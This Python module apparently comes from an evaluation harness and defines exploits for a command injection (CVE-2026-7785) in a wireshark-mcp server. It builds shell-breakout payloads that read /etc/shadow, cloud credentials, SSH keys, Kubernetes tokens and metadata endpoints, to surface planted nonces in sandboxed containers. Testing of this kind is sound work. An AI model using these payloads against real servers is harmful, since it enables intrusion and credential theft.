"""CVE-2026-7785: OS command injection in wireshark-mcp quick_capture (CWE-78).

The vulnerable server (commit 400c3da) builds `tshark -i "{interface}" ...` and runs it with
subprocess.Popen(shell=True); `interface` is attacker-controlled, so any shell command runs. The
first fixed commit (6e56043) runs tshark via argv (shell=False) and validate_capture_interface
rejects shell metacharacters and requires an exact interface match, blocking the injection.

The flaw is general command execution, so the exploit surfaces a planted nonce from every place
the executed command can reach and the server does not read itself. Each exploit breaks out of the
tshark interface quoting and emits one tab-separated line whose src field carries the nonce; the
server parses that line and echoes src under "Top Source IPs".
"""

import re
from collections.abc import Awaitable, Callable

from evals.cve_environments import command_injection_env
from evals.cve_grammar import MechanismClass
from evals.cve_places import Place, Places
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_planting_spec import resolve_container_path
from evals.cve_targets import CVETarget
from mcp_auditor.domain.ports import MCPClientPort

WORKDIR = "/tmp"

# command_execution-reachable, plantable places the server does not read itself.
KEPT_PLACES: tuple[str, ...] = (
    "process-account-identity",
    "etc-shadow",
    "container-hostname",
    "aws-credentials",
    "gcloud-adc",
    "azure-profile",
    "ssh-private-key",
    "shell-history",
    "git-credentials",
    "npmrc",
    "gh-hosts",
    "docker-config",
    "kube-config",
    "pgpass",
    "mysql-client-cnf",
    "mongorc",
    "mysql-system-cnf",
    "proc-environ",
    "run-secrets",
    "k8s-sa-token",
    "imds",
    "ecs-task-credentials",
    "eks-pod-identity",
    "etc-hosts",
    "auth-log",
)

# Any shell metacharacter in a tool argument marks a command-execution attempt. The benign call
# (interface="lo") carries none of these.
AIM = re.compile(r'[;"$`|&]')


def _breakout(inner: str) -> str:
    # Break out of `tshark -i "<here>" -c ...` to run `inner`, then swallow the tail with `:`.
    # `inner` carries no double quote (it sits inside the broken-out shell context) and prints one
    # tab-separated line `1\t<nonce>\tB\tC` so the server records src=<nonce>.
    return f'x"; {inner}; : "'


def _shell_read_payload(inner_read: str) -> str:
    return _breakout(f"printf '1\\t%s\\tB\\tC\\n' \"$({inner_read})\"")


def _http_payload(url: str) -> str:
    py = (
        "import urllib.request as u; "
        f"print('1\\t'+u.urlopen('{url}',timeout=8).read().decode()+'\\tB\\tC')"
    )
    return _breakout(f'python3 -c "{py}"')


def _file_read_cmd(place: Place) -> str:
    coords = place.coordinates
    if coords.path is not None:
        raw = coords.path
    else:
        assert coords.paths is not None
        raw = coords.paths[0]
    container_path = resolve_container_path(raw, WORKDIR)
    return f"cat {container_path} 2>/dev/null"


def _payload_for(place: Place) -> str:
    kind = place.kind.value
    if kind == "file":
        return _shell_read_payload(_file_read_cmd(place))
    if kind == "env":
        return _shell_read_payload(f"printenv {place.coordinates.name}")
    if kind == "account":
        return _shell_read_payload("id -un")
    if kind == "hostname":
        return _shell_read_payload("cat /proc/sys/kernel/hostname")
    if kind == "http_endpoint":
        url = f"http://{place.coordinates.host}{place.coordinates.path}"
        return _http_payload(url)
    raise ValueError(f"no payload for kind {kind}")


async def _quick_capture(client: MCPClientPort, interface: str) -> None:
    await client.call_tool(
        "quick_capture", {"interface": interface, "duration": 1, "packet_limit": 1}
    )


def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
    async def run(places: Places, client: MCPClientPort) -> None:
        await _quick_capture(client, _payload_for(places[place_id]))

    return run


async def _benign(places: Places, client: MCPClientPort) -> None:
    await _quick_capture(client, "lo")


TARGET = CVETarget(
    cve_id="CVE-2026-7785",
    severity="CVSS 8.8 (v3.1, placeholder)",
    mechanism=MechanismClass.COMMAND_EXECUTION,
    aim=AIM,
    reaches=frozenset({"command_execution"}),
    kept_places=KEPT_PLACES,
    images=("holdout-2026-7785-wireshark",),
    server_image="holdout-2026-7785-wireshark",
    patched_image="holdout-2026-7785-wireshark-patched",
    planting_host=PlantingHost(SymbolicUser.UNPRIVILEGED, WORKDIR, has_network=False),
    builder=command_injection_env,
    exploits=tuple(_exploit(place_id) for place_id in KEPT_PLACES),
    benign=_benign,
    awaited_capability=None,
    note=(
        "OS command injection (CWE-78): quick_capture interpolates the attacker-controlled "
        "interface into a tshark command run with shell=True, so a shell metacharacter executes "
        "an arbitrary command in the server's container."
    ),
    tools_filter=None,
    ci_skip_reason=None,
)
